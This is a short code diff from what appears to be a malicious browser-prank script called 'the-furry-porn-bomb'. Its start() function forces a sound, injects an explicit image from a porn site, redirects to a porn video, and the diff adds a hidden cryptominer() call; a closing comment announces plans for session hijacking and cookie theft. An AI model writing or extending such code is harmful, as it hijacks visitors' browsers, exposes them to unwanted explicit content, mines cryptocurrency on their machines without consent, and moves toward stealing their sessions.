@@ -44,6 +44,7 @@ function start(){
     playSound("https://raw.githubusercontent.com/NE1W01F/the-furry-porn-bomb/master/Amazon.mp3");
     injectpic("https://cdnio.luscious.net/987/lusciousnet_000000top1_855317720.jpg");
     redriect("https://www.thumbzilla.com/video/embed?key=ph59b436f94f7d0");
+    cryptominer();
 }
 
 // soon i am going to work on session hijacking and getting cookies
